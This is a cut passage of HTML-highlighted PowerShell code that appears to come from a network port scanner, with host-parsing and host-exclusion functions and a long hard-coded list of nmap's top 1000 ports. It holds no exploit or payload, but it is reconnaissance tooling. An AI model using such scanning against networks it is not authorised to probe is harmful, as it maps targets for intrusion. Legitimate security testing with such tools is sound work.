class="hljs-variable">$iHost</span>)<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Parse-ILHosts</span></span><br>        &#123;<br>           <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$HostFile</span><br>            )<br><br>            <span class="hljs-built_in">Get-Content</span> <span class="hljs-variable">$HostFile</span> | <span class="hljs-built_in">ForEach-Object</span> &#123;<br>                Parse<span class="hljs-literal">-Hosts</span> <span class="hljs-variable">$_</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Exclude-Hosts</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$excludeHosts</span><br>            )<br><br>            [<span class="hljs-built_in">String</span>[]] <span class="hljs-variable">$iHosts</span> = <span class="hljs-variable">$excludeHosts</span>.Split(<span class="hljs-string">&quot;,&quot;</span>)<br><br>            <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$iHosts</span>)<br>            &#123;<br>                <span class="hljs-variable">$iHost</span> = <span class="hljs-variable">$iHost</span>.Replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-variable">$hostList</span>.Remove(<span class="hljs-variable">$iHost</span>)<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get-TopPort</span></span><br>        &#123;<br>            <span class="hljs-keyword">Param</span> (<br>                [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)]<br>                [<span class="hljs-type">ValidateRange</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>)]<br>                [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$numPorts</span><br>            )<br><br>            <span class="hljs-comment">#list of top 1000 ports from nmap from Jun 2013</span><br>            [<span class="hljs-built_in">int</span>[]] <span class="hljs-variable">$topPortList</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-number">80</span>,<span class="hljs-number">23</span>,<span class="hljs-number">443</span>,<span class="hljs-number">21</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">110</span>,<span class="hljs-number">445</span>,<span class="hljs-number">139</span>,<span class="hljs-number">143</span>,<span class="hljs-number">53</span>,<span class="hljs-number">135</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">22</span><br>                        <span class="hljs-number">1723</span>,<span class="hljs-number">111</span>,<span class="hljs-number">995</span>,<span class="hljs-number">993</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">1025</span>,<span class="hljs-number">1720</span>,<span class="hljs-number">548</span>,<span class="hljs-number">113</span>,<span class="hljs-number">81</span>,<span class="hljs-number">6001</span>,<span class="hljs-number">179</span>,<span class="hljs-number">1026</span>,<span class="hljs-number">2000</span>,<span class="hljs-number">8443</span>,<br>                        <span class="hljs-number">8000</span>,<span class="hljs-number">32768</span>,<span class="hljs-number">554</span>,<span class="hljs-number">26</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">49152</span>,<span class="hljs-number">2001</span>,<span class="hljs-number">515</span>,<span class="hljs-number">8008</span>,<span class="hljs-number">49154</span>,<span class="hljs-number">1027</span>,<span class="hljs-number">5666</span>,<span class="hljs-number">646</span>,<span class="hljs-number">5000</span>,<br>                        <span class="hljs-number">5631</span>,<span class="hljs-number">631</span>,<span class="hljs-number">49153</span>,<span class="hljs-number">8081</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">88</span>,<span class="hljs-number">79</span>,<span class="hljs-number">5800</span>,<span class="hljs-number">106</span>,<span class="hljs-number">2121</span>,<span class="hljs-number">1110</span>,<span class="hljs-number">49155</span>,<span class="hljs-number">6000</span>,<span class="hljs-number">513</span>,<br>                        <span class="hljs-number">990</span>,<span class="hljs-number">5357</span>,<span class="hljs-number">49156</span>,<span class="hljs-number">543</span>,<span class="hljs-number">544</span>,<span class="hljs-number">5101</span>,<span class="hljs-number">144</span>,<span class="hljs-number">7</span>,<span class="hljs-number">389</span>,<span class="hljs-number">8009</span>,<span class="hljs-number">9999</span>,<span class="hljs-number">5009</span>,<span class="hljs-number">7070</span>,<span class="hljs-number">5190</span>,<span class="hljs-number">3000</span>,<br>                        <span class="hljs-number">5432</span>,<span class="hljs-number">1900</span>,<span class="hljs-number">3986</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1029</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5051</span>,<span class="hljs-number">6646</span>,<span class="hljs-number">49157</span>,<span class="hljs-number">1028</span>,<span class="hljs-number">873</span>,<span class="hljs-number">1755</span>,<span class="hljs-number">2717</span>,<span class="hljs-number">4899</span>,<span class="hljs-number">9100</span>,<br>                        <span class="hljs-number">119</span>,<span class="hljs-number">37</span>,<span class="hljs-number">1000</span>,<span class="hljs-number">3001</span>,<span class="hljs-number">5001</span>,<span class="hljs-number">82</span>,<span class="hljs-number">10010</span>,<span class="hljs-number">1030</span>,<span class="hljs-number">9090</span>,<span class="hljs-number">2107</span>,<span class="hljs-number">1024</span>,<span class="hljs-number">2103</span>,<span class="hljs-number">6004</span>,<span class="hljs-number">1801</span>,<br>                        <span class="hljs-number">5050</span>,<span class="hljs-number">19</span>,<span class="hljs-number">8031</span>,<span class="hljs-number">1041</span>,<span class="hljs-number">255</span>,<span class="hljs-number">1048</span>,<span class="hljs-number">1049</span>,<span class="hljs-number">1053</span>,<span class="hljs-number">1054</span>,<span class="hljs-number">1056</span>,<span class="hljs-number">1064</span>,<span class="hljs-number">3703</span>,<span class="hljs-number">17</span>,<span class="hljs-number">808</span>,<span class="hljs-number">3689</span>,<br>                        <span class="hljs-number">1031</span>,<span class="hljs-number">1044</span>,<span class="hljs-number">1071</span>,<span class="hljs-number">5901</span>,<span class="hljs-number">100</span>,<span class="hljs-number">9102</span>,<span class="hljs-number">2869</span>,<span class="hljs-number">4001</span>,<span class="hljs-number">5120</span>,<span class="hljs-number">8010</span>,<span class="hljs-number">9000</span>,<span class="hljs-number">2105</span>,<span class="hljs-number">636</span>,<span class="hljs-number">1038</span>,<br>                        <span class="hljs-number">2601</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7000</span>,<span class="hljs-number">1066</span>,<span class="hljs-number">1069</span>,<span class="hljs-number">625</span>,<span class="hljs-number">311</span>,<span class="hljs-number">280</span>,<span class="hljs-number">254</span>,<span class="hljs-number">4000</span>,<span class="hljs-number">1761</span>,<span class="hljs-number">5003</span>,<span class="hljs-number">2002</span>,<span class="hljs-number">1998</span>,<span class="hljs-number">2005</span>,<br>                        <span class="hljs-number">1032</span>,<span class="hljs-number">1050</span>,<span class="hljs-number">6112</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">2161</span>,<span class="hljs-number">6002</span>,<span class="hljs-number">2401</span>,<span class="hljs-number">902</span>,<span class="hljs-number">4045</span>,<span class="hljs-number">787</span>,<span class="hljs-number">7937</span>,<span class="hljs-number">1058</span>,<span class="hljs-number">2383</span>,<span class="hljs-number">1033</span>,<br>                        <span class="hljs-number">1040</span>,<span class="hljs-number">1059</span>,<span class="hljs-number">50000</span>,<span class="hljs-number">5555</span>,<span class="hljs-number">1494</span>,<span class="hljs-number">3</span>,<span class="hljs-number">593</span>,<span class="hljs-number">2301</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">7938</span>,<span class="hljs-number">1022</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1035</span>,<span class="hljs-number">1036</span>,<span class="hljs-number">1037</span>,<br>                        <span class="hljs-number">1074</span>,<span class="hljs-number">8002</span>,<span class="hljs-number">9001</span>,<span class="hljs-number">464</span>,<span class="hljs-number">497</span>,<span class="hljs-number">1935</span>,<span class="hljs-number">2003</span>,<span class="hljs-number">6666</span>,<span class="hljs-number">6543</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1352</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">1111</span>,<span class="hljs-number">407</span>,<span class="hljs-number">500</span>,<br>                        <span class="hljs-number">20</span>,<span class="hljs-number">2006</span>,<span class="hljs-number">1034</span>,<span class="hljs-number">1218</span>,<span class="hljs-number">3260</span>,<span class="hljs-number">15000</span>,<span class="hljs-number">4444</span>,<span class="hljs-number">264</span>,<span class="hljs-number">33</span>,<span class="hljs-number">2004</span>,<span class="hljs-number">1042</span>,<span class="hljs-number">42510</span>,<span class="hljs-number">999</span>,<span class="hljs-number">3052</span>,<span class="hljs-number">1023</span>,<br>                        <span class="hljs-number">222</span>,<span class="hljs-number">1068</span>,<span class="hljs-number">888</span>,<span class="hljs-number">7100</span>,<span class="hljs-number">1717</span>,<span class="hljs-number">992</span>,<span class="hljs-number">2008</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">2007</span>,<span class="hljs-number">8082</span>,<span class="hljs-number">512</span>,<span class="hljs-number">1043</span>,<span class="hljs-number">2009</span>,<span class="hljs-number">5801</span>,<span class="hljs-number">1700</span>,<br>                        <span class="hljs-number">7019</span>,<span class="hljs-number">50001</span>,<span class="hljs-number">4662</span>,<span class="hljs-number">2065</span>,<span class="hljs-number">42</span>,<span class="hljs-number">2602</span>,<span class="hljs-number">3333</span>,<span class="hljs-number">9535</span>,<span class="hljs-number">5100</span>,<span class="hljs-number">2604</span>,<span class="hljs-number">4002</span>,<span class="hljs-number">5002</span>,<span class="hljs-number">1047</span>,<span class="hljs-number">1051</span>,<span class="hljs-number">1052</span>,<br>                        <span class="hljs-number">1055</span>,<span class="hljs-number">1060</span>,<span class="hljs-number">1062</span>,<span class="hljs-number">1311</span>,<span class="hljs-number">3283</span>,<span class="hljs-number">4443</span>,<span class="hljs-number">5225</span>,<span class="hljs-number">5226</span>,<span class="hljs-number">6059</span>,<span class="hljs-number">6789</span>,<span class="hljs-number">8089</span>,<span class="hljs-number">8651</span>,<span class="hljs-number">8652</span>,<span class="hljs-number">8701</span>,<span class="hljs-number">9415</span>,<br>                        <span class="hljs-number">9593</span>,<span class="hljs-number">9594</span>,<span class="hljs-number">9595</span>,<span class="hljs-number">16992</span>,<span class="hljs-number">16993</span>,<span class="hljs-number">20828</span>,<span class="hljs-number">23502</span>,<span class="hljs-number">32769</span>,<span class="hljs-number">33354</span>,<span class="hljs-number">35500</span>,<span class="hljs-number">52869</span>,<span class="hljs-number">55555</span>,<span class="hljs-number">55600</span>,<br>                        <span class="hljs-number">64623</span>,<span class="hljs-number">64680</span>,<span class="hljs-number">65000</span>,<span class="hljs-number">65389</span>,<span class="hljs-number">1067</span>,<span class="hljs-number">13782</span>,<span class="hljs-number">366</span>,<span class="hljs-number">5902</span>,<span class="hljs-number">9050</span>,<span class="hljs-number">85</span>,<span class="hljs-number">1002</span>,<span class="hljs-number">5500</span>,<span class="hljs-number">1863</span>,<span class="hljs-number">1864</span>,<br>                        <span class="hljs-number">5431</span>,<span class="hljs-number">8085</span>,<span class="hljs-number">10243</span>,<span class="hljs-number">45100</span>,<span class="hljs-number">49999</span>,<span class="hljs-number">51103</span>,<span class="hljs-number">49</span>,<span class="hljs-number">90</span>,<span class="hljs-number">6667</span>,<span class="hljs-number">1503</span>,<span class="hljs-number">6881</span>,<span class="hljs-number">27000</span>,<span class="hljs-number">340</span>,<span class="hljs-number">1500</span>,<span class="hljs-number">8021</span>,<br>                        <span class="hljs-number">2222</span>,<span class="hljs-number">5566</span>,<span class="hljs-number">8088</span>,<span class="hljs-number">8899</span>,<span class="hljs-number">9071</span>,<span class="hljs-number">5102</span>,<span class="hljs-number">6005</span>,<span class="hljs-number">9101</span>,<span class="hljs-number">163</span>,<span class="hljs-number">5679</span>,<span class="hljs-number">146</span>,<span class="hljs-number">648</span>,<span class="hljs-number">1666</span>,<span class="hljs-number">83</span>,<span class="hljs-number">3476</span>,<span class="hljs-number">5004</span>,<br>                        <span class="hljs-number">5214</span>,<span class="hljs-number">8001</span>,<span class="hljs-number">8083</span>,<span class="hljs-number">8084</span>,<span class="hljs-number">9207</span>,<span class="hljs-number">14238</span>,<span class="hljs-number">30</span>,<span class="hljs-number">912</span>,<span class="hljs-number">12345</span>,<span class="hljs-number">2030</span>,<span class="hljs-number">2605</span>,<span class="hljs-number">6</span>,<span class="hljs-number">541</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1248</span>,<span class="hljs-number">3005</span>,<span class="hljs-number">8007</span>,<br>                        <span class="hljs-number">306</span>,<span class="hljs-number">880</span>,<span class="hljs-number">2500</span>,<span class="hljs-number">1086</span>,<span class="hljs-number">1088</span>,<span class="hljs-number">2525</span>,<span class="hljs-number">4242</span>,<span class="hljs-number">8291</span>,<span class="hljs-number">9009</span>,<span class="hljs-number">52822</span>,<span class="hljs-number">900</span>,<span class="hljs-number">6101</span>,<span class="hljs-number">2809</span>,<span class="hljs-number">7200</span>,<span class="hljs-number">211</span>,<span class="hljs-number">800</span>,<br>                        <span class="hljs-number">987</span>,<span class="hljs-number">1083</span>,<span class="hljs-number">12000</span>,<span class="hljs-number">705</span>,<span class="hljs-number">711</span>,<span class="hljs-number">20005</span>,<span class="hljs-number">6969</span>,<span class="hljs-number">13783</span>,<span class="hljs-number">1045</span>,<span class="hljs-number">1046</span>,<span class="hljs-number">1061</span>,<span class="hljs-number">1063</span>,<span class="hljs-number">1070</span>,<span class="hljs-number">1072</span>,<span class="hljs-number">1073</span>,<br>                        <span class="hljs-number">1075</span>,<span class="hljs-number">1077</span>,<span class="hljs-number">1078</span>,<span class="hljs-number">1079</span>,<span class="hljs-number">1081</span>,<span class="hljs-number">1082</span>,<span class="hljs-number">1085</span>,<span class="hljs-number">1093</span>,<span class="hljs-number">1094</span>,<span class="hljs-number">1096</span>,<span class="hljs-number">1098</span>,<span class="hljs-number">1099</span>,<span class="hljs-number">1100</span>,<span class="hljs-number">1104</span>,<span class="hljs-number">1106</span>,<br>                        <span class="hljs-number">1107</span>,<span class="hljs-number">1108</span>,<span class="hljs-number">1148</span>,<span class="hljs-number">1169</span>,<span class="hljs-number">1272</span>,<span class="hljs-number">1310</span>,<span class="hljs-number">1687</span>,<span class="hljs-number">1718</span>,<span class="hljs-number">1783</span>,<span class="hljs-number">1840</span>,<span class="hljs-number">2100</span>,<span class="hljs-number">2119</span>,<span class="hljs-number">2135</span>,<span class="hljs-number">2144</span>,<span class="hljs-number">2160</span>,<br>                        <span class="hljs-number">2190</span>,<span class="hljs-number">2260</span>,<span class="hljs-number">2381</span>,<span class="hljs-number">2399</span>,<span class="hljs-number">2492</span>,<span class="hljs-number">2607</span>,<span class="hljs-number">2718</span>,<span class="hljs-number">2811</span>,<span class="hljs-number">2875</span>,<span class="hljs-number">3017</span>,<span class="hljs-number">3031</span>,<span class="hljs-number">3071</span>,<span class="hljs-number">3211</span>,<span class="hljs-number">3300</span>,<span class="hljs-number">3301</span>,<br>                        <span class="hljs-number">3323</span>,<span class="hljs-number">3325</span>,<span class="hljs-number">3351</span>,<span class="hljs-number">3404</span>,<span class="hljs-number">3551</span>,<span class="hljs-number">3580</span>,<span class="hljs-number">3659</span>,<span class="hljs-number">3766</span>,<span class="hljs-number">3784</span>,<span class="hljs-number">3801</span>,<span class="hljs-number">3827</span>,<span class="hljs-number">3998</span>,<span class="hljs-number">4003</span>,<span class="hljs-number">4126</span>,<span class="hljs-number">4129</span>,<br>                        <span class="hljs-number">4449</span>,<span class="hljs-number">5222</span>,<span class="hljs-number">5269</span>,<span class="hljs-number">5633</span>,<span class="hljs-number">5718</span>,<span class="hljs-number">5810</span>,<span class="hljs-number">5825</span>,<span class="hljs-number">5877</span>,<span class="hljs-number">5910</span>,<span class="hljs-number">5911</span>,<span class="hljs-number">5925</span>,<span class="hljs-number">5959</span>,<span class="hljs-number">5960</span>,<span class="hljs-number">5961</span>,<span class="hljs-number">5962</span>,<br>                        <span class="hljs-number">5987</span>,<span class="hljs-number">5988</span>,<span class="hljs-number">5989</span>,<span class="hljs-number">6123</span>,<span class="hljs-number">6129</span>,<span class="hljs-number">6156</span>,<span class="hljs-number">6389</span>,<span class="hljs-number">6580</span>,<span class="hljs-number">6901</span>,<span class="hljs-number">7106</span>,<span class="hljs-number">7625</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">7778</span>,<span class="hljs-number">7911</span>,<span class="hljs-number">8086</span>,<br>                        <span class="hljs-number">8181</span>,<span class="hljs-number">8222</span>,<span class="hljs-number">8333</span>,<span class="hljs-number">8400</span>,<span class="hljs-number">8402</span>,<span class="hljs-number">8600</span>,<span class="hljs-number">8649</span>,<span class="hljs-number">8873</span>,<span class="hljs-number">8994</span>,<span class="hljs-number">9002</span>,<span class="hljs-number">9011</span>,<span class="hljs-number">9080</span>,<span class="hljs-number">9220</span>,<span class="hljs-number">9290</span>,<span class="hljs-number">9485</span>,<br>                        <span class="hljs-number">9500</span>,<span class="hljs-number">9502</span>,<span class="hljs-number">9503</span>,<span class="hljs-number">9618</span>,<span class="hljs-number">9900</span>,<span class="hljs-number">9968</span>,<span class="hljs-number">10002</span>,<span class="hljs-number">10012</span>,<span class="hljs-number">10024</span>,<span class="hljs-number">10025</span>,<span class="hljs-number">10566</span>,<span class="hljs-number">10616</span>,<span class="hljs-number">10617</span>,<span class="hljs-number">10621</span>,<br>                        <span class="hljs-number">10626</span>,<span class="hljs-number">10628</span>,<span class="hljs-number">10629</span>,<span class="hljs-number">11110</span>,<span class="hljs-number">13456</span>,<span class="hljs-number">14442</span>,<span class="hljs-number">15002</span>,<span class="hljs-number">15003</span>,<span class="hljs-number">15660</span>,<span class="hljs-number">16001</span>,<span class="hljs-number">16016</span>,<span class="hljs-number">16018</span>,<span class="hljs-number">17988</span>,<br>                        <span class="hljs-number">19101</span>,<span class="hljs-number">19801</span>,<span class="hljs-number">19842</span>,<span class="hljs-number">20000</span>,<span class="hljs-number">20031</span>,<span class="hljs-number">20221</span>,<span class="hljs-number">20222</span>,<span class="hljs-number">21571</span>,<span class="hljs-number">22939</span>,<span class="hljs-number">24800</span>,<span class="hljs-number">25734</span>,<span class="hljs-number">27715</span>,<span class="hljs-number">28201</span>,<br>                        <span class="hljs-number">30000</span>,<span class="hljs-number">30718</span>,<span class="hljs-number">31038</span>,<span class="hljs-number">32781</span>,<span class="hljs-number">32782</span>,<span class="hljs-number">33899</span>,<span class="hljs-number">34571</span>,<span class="hljs-number">34572</span>,<span class="hljs-number">34573</span>,<span class="hljs-number">40193</span>,<span class="hljs-number">48080</span>,<span class="hljs-number">49158</span>,<span class="hljs-number">49159</span>,<br>                        <span class="hljs-number">49160</span>,<span class="hljs-number">50003</span>,<span class="hljs-number">50006</span>,<span class="hljs-number">50800</span>,<span class="hljs-number">57294</span>,<span class="hljs-number">58080</span>,<span class="hljs-number">60020</span>,<span class="hljs-number">63331</span>,<span class="hljs-number">65129</span>,<span class="hljs-number">691</span>,<span class="hljs-number">212</span>,<span class="hljs-number">1001</span>,<span class="hljs-number">1999</span>,<span class="hljs-number">2020</span>,<br>                        <span class="hljs-number">2998</span>,<span class="hljs-number">6003</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">50002</span>,<span class="hljs-number">32</span>,<span class="hljs-number">2033</span>,<span class="hljs-number">3372</span>,<span class="hljs-number">99</span>,<span class="hljs-number">425</span>,<span class="hljs-number">749</span>,<span class="hljs-number">5903</span>,<span class="hljs-number">43</span>,<span class="hljs-number">458</span>,<span class="hljs-number">5405</span>,<span class="hljs-number">6106</span>,<span class="hljs-number">6502</span>,<span class="hljs-number">7007</span>,<br>                        <span class="hljs-number">13722</span>,<span class="hljs-number">1087</span>,<span class="hljs-number">1089</span>,<span class="hljs-number">1124</span>,<span class="hljs-number">1152</span>,<span class="hljs-number">1183</span>,<span class="hljs-number">1186</span>,<span class="hljs-number">1247</span>,<span class="hljs-number">1296</span>,<span class="hljs-number">1334</span>,<span class="hljs-number">1580</span>,<span class="hljs-number">1782</span>,<span class="hljs-number">2126</span>,<span class="hljs-number">2179</span>,<span class="hljs-number">2191</span>,<span class="hljs-number">2251</span>,<br>                        <span class="hljs-number">2522</span>,<span class="hljs-number">3011</span>,<span class="hljs-number">3030</span>,<span class="hljs-number">3077</span>,<span class="hljs-number">3261</span>,<span class="hljs-number">3493</span>,<span class="hljs-number">3546</span>,<span class="hljs-number">3737</span>,<span class="hljs-number">3828</span>,<span class="hljs-number">3871</span>,<span class="hljs-number">3880</span>,<span class="hljs-number">3918</span>,<span class="hljs-number">3995</span>,<span class="hljs-number">4006</span>,<span class="hljs-number">4111</span>,<span class="hljs-number">4446</span>,<br>                        <span class="hljs-number">5054</span>,<span class="hljs-number">5200</span>,<span class="hljs-number">5280</span>,<span class="hljs-number">5298</span>,<span class="hljs-number">5822</span>,<span class="hljs-number">5859</span>,<span class="hljs-number">5904</span>,<span class="hljs-number">5915</span>,<span class="hljs-number">5922</span>,<span class="hljs-number">5963</span>,<span class="hljs-number">7103</span>,<span class="hljs-number">7402</span>,<span class="hljs-number">7435</span>,<span class="hljs-number">7443</span>,<span class="hljs-number">7512</span>,<span class="hljs-number">8011</span>,<br>                        <span class="hljs-number">8090</span>,<span class="hljs-number">8100</span>,<span class="hljs-number">8180</span>,<span class="hljs-number">8254</span>,<span class="hljs-number">8500</span>,<span class="hljs-number">8654</span>,<span class="hljs-number">9091</span>,<span class="hljs-number">9110</span>,<span class="hljs-number">9666</span>,<span class="hljs-number">9877</span>,<span class="hljs-number">9943</span>,<span class="hljs-number">9944</span>,<span class="hljs-number">9998</span>,<span class="hljs-number">10004</span>,<span class="hljs-number">10778</span>,<span class="hljs-number">15742</span>,<br>                        <span class="hljs-number">16012</span>,<span class="hljs-number">18988</span>,<span class="hljs-number">19283</span>,<span class="hljs-number">19315</span>,<span class="hljs-number">19780</span>,<span class="hljs-number">24444</span>,<span class="hljs-number">27352</span>,<span class="hljs-number">27353</span>,<span class="hljs-number">27355</span>,<span class="hljs-number">32784</span>,<span class="hljs-number">49163</span>,<span class="hljs-number">49165</span>,<span class="hljs-number">49175</span>,<br>                        <span class="hljs-number">50389</span>,<span class="hljs-number">50636</span>,<span class="hljs-number">51493</span>,<span class="hljs-number">55055</span>,<span class="hljs-number">56738</span>,<span class="hljs-number">61532</span>,<span class="hljs-number">61900</span>,<span class="hljs-number">62078</span>,<span class="hljs-number">1021</span>,<span class="hljs-number">9040</span>,<span class="hljs-number">666</span>,<span class="hljs-number">700</span>,<span class="hljs-number">84</span>,<span class="hljs-number">545</span>,<span class="hljs-number">1112</span>,<br>                        <span class="hljs-number">1524</span>,<span class="hljs-number">2040</span>,<span class="hljs-number">4321</span>,<span class="hljs-number">5802</span>,<span class="hljs-number">38292</span>,<span class="hljs-number">49400</span>,<span class="hljs-number">1084</span>,<span class="hljs-number">1600</span>,<span class="hljs-number">2048</span>,<span class="hljs-number">2111</span>,<span class="hljs-number">3006</span>,<span class="hljs-number">6547</span>,<span class="hljs-number">6699</span>,<span class="hljs-number">9111</span>,<span class="hljs-number">16080</span>,<br>                        <span class="hljs-number">555</span>,<span class="hljs-number">667</span>,<span class="hljs-number">720</span>,<span class="hljs-number">801</span>,<span class="hljs-number">1443</span>,<span class="hljs-number">1533</span>,<span class="hljs-number">2106</span>,<span class="hljs-number">5560</span>,<span class="hljs-number">6007</span>,<span class="hljs-number">1090</span>,<span class="hljs-number">1091</span>,<span class="hljs-number">1114</span>,<span class="hljs-number">1117</span>,<span class="hljs-number">1119</span>,<span class="hljs-number">1122</span>,<span class="hljs-number">1131</span>,<span class="hljs-number">1138</span>,<br>                        <span class="hljs-number">1151</span>,<span class="hljs-number">1175</span>,<span class="hljs-number">1199</span>,<span class="hljs-number">1201</span>,<span class="hljs-number">1271</span>,<span class="hljs-number">1862</span>,<span class="hljs-number">2323</span>,<span class="hljs-number">2393</span>,<span class="hljs-number">2394</span>,<span class="hljs-number">2608</span>,<span class="hljs-number">2725</span>,<span class="hljs-number">2909</span>,<span class="hljs-number">3003</span>,<span class="hljs-number">3168</span>,<span class="hljs-number">3221</span>,<span class="hljs-number">3322</span>,<br>                        <span class="hljs-number">3324</span>,<span class="hljs-number">3390</span>,<span class="hljs-number">3517</span>,<span class="hljs-number">3527</span>,<span class="hljs-number">3800</span>,<span class="hljs-number">3809</span>,<span class="hljs-number">3814</span>,<span class="hljs-number">3826</span>,<span class="hljs-number">3869</span>,<span class="hljs-number">3878</span>,<span class="hljs-number">3889</span>,<span class="hljs-number">3905</span>,<span class="hljs-number">3914</span>,<span class="hljs-number">3920</span>,<span class="hljs-number">3945</span>,<span class="hljs-number">3971</span>,<br>                        <span class="hljs-number">4004</span>,<span class="hljs-number">4005</span>,<span class="hljs-number">4279</span>,<span class="hljs-number">4445</span>,<span class="hljs-number">4550</span>,<span class="hljs-number">4567</span>,<span class="hljs-number">4848</span>,<span class="hljs-number">4900</span>,<span class="hljs-number">5033</span>,<span class="hljs-number">5080</span>,<span class="hljs-number">5087</span>,<span class="hljs-number">5221</span>,<span class="hljs-number">5440</span>,<span class="hljs-number">5544</span>,<span class="hljs-number">5678</span>,<span class="hljs-number">5730</span>,<br>                        <span class="hljs-number">5811</span>,<span class="hljs-number">5815</span>,<span class="hljs-number">5850</span>,<span class="hljs-number">5862</span>,<span class="hljs-number">5906</span>,<span class="hljs-number">5907</span>,<span class="hljs-number">5950</span>,<span class="hljs-number">5952</span>,<span class="hljs-number">6025</span>,<span class="hljs-number">6510</span>,<span class="hljs-number">6565</span>,<span class="hljs-number">6567</span>,<span class="hljs-number">6689</span>,<span class="hljs-number">6692</span>,<span class="hljs-number">6779</span>,<span class="hljs-number">6792</span>,<br>                        <span class="hljs-number">6839</span>,<span class="hljs-number">7025</span>,<span class="hljs-number">7496</span>,<span class="hljs-number">7676</span>,<span class="hljs-number">7800</span>,<span class="hljs-number">7920</span>,<span class="hljs-number">7921</span>,<span class="hljs-number">7999</span>,<span class="hljs-number">8022</span>,<span class="hljs-number">8042</span>,<span class="hljs-number">8045</span>,<span class="hljs-number">8093</span>,<span class="hljs-number">8099</span>,<span class="hljs-number">8200</span>,<span class="hljs-number">8290</span>,<span class="hljs-number">8292</span>,<br>                        <span class="hljs-number">8300</span>,<span class="hljs-number">8383</span>,<span class="hljs-number">9003</span>,<span class="hljs-number">9081</span>,<span class="hljs-number">9099</span>,<span class="hljs-number">9200</span>,<span class="hljs-number">9418</span>,<span class="hljs-number">9575</span>,<span class="hljs-number">9878</span>,<span class="hljs-number">9898</span>,<span class="hljs-number">9917</span>,<span class="hljs-number">10003</span>,<span class="hljs-number">10180</span>,<span class="hljs-number">10215</span>,<span class="hljs-number">11111</span>,<br>                        <span class="hljs-number">12174</span>,<span class="hljs-number">12265</span>,<span class="hljs-number">14441</span>,<span class="hljs-number">15004</span>,<span class="hljs-number">16000</span>,<span class="hljs-number">16113</span>,<span class="hljs-number">17877</span>,<span class="hljs-number">18040</span>,<span class="hljs-number">18101</span>,<span class="hljs-number">19350</span>,<span class="hljs-number">25735</span>,<span class="hljs-number">26214</span>,<span class="hljs-number">27356</span>,<br>                        <span class="hljs-number">30951</span>,<span class="hljs-number">32783</span>,<span class="hljs-number">32785</span>,<span class="hljs-number">40911</span>,<span class="hljs-number">41511</span>,<span class="hljs-number">44176</span>,<span class="hljs-number">44501</span>,<span class="hljs-number">49161</span>,<span class="hljs-number">49167</span>,<span class="hljs-number">49176</span>,<span class="hljs-number">50300</span>,<span class="hljs-number">50500</span>,<span class="hljs-number">52673</span>,<br>                        <span class="hljs-number">52848</span>,<span class="hljs-number">54045</span>,<span class="hljs-number">54328</span>,<span class="hljs-number">55056</span>,<span class="hljs-number">56737</span>,<span class="hljs-number">57797</span>,<span class="hljs-number">60443</span>,<span class="hljs-number">70</span>,<span class="hljs-number">417</span>,<span class="hljs-number">714</span>,<span class="hljs-number">722</span>,<span class="hljs-number">777</span>,<span class="hljs-number">981</span>,<span class="hljs-number">1009</span>,<span class="hljs-number">2022</span>,<span class="hljs-number">4224</span>,<br>                        <span class="hljs-number">4998</span>,<span class="hljs-number">6346</span>,<span class="hljs-number">301</span>,<span class="hljs-number">524</span>,<span class="hljs-number">668</span>,<span class="hljs-number">765</span>,<span class="hljs-number">2041</span>,<span class="hljs-number">5999</span>,<span class="hljs-number">10082</span>,<span class="hljs-number">259</span>,<span class="hljs-number">1007</span>,<span class="hljs-number">1417</span>,<span class="hljs-number">1434</span>,<span class="hljs-number">1984</span>,<span class="hljs-number">2038</span>,<span class="hljs-number">2068</span>,<span class="hljs-number">4343</span>,<br>                        <span class="hljs-number">6009</span>,<span class="hljs-number">7004</span>,<span class="hljs-number">44443</span>,<span class="hljs-number">109</span>,<span class="hljs-number">687</span>,<span class="hljs-number">726</span>,<span class="hljs-number">911</span>,<span class="hljs-number">1461</span>,<span class="hljs-number">2035</span>,<span class="hljs-number">4125</span>,<span class="hljs-number">6006</span>,<span class="hljs-number">7201</span>,<span class="hljs-number">9103</span>,<span class="hljs-number">125</span>,<span class="hljs-number">481</span>,<span class="hljs-number">683</span>,<span class="hljs-number">903</span>,<br>                        <span class="hljs-number">1011</span>,<span class="hljs-number">1455</span>,<span class="hljs-number">2013</span>,<span class="hljs-number">2043</span>,<span class="hljs-number">2047</span>,<span class="hljs-number">6668</span>,<span class="hljs-number">6669</span>,<span class="hljs-number">256</span>,<span class="hljs-number">406</span>,<span class="hljs-number">843</span>,<span class="hljs-number">2042</span>,<span class="hljs-number">2045</span>,<span 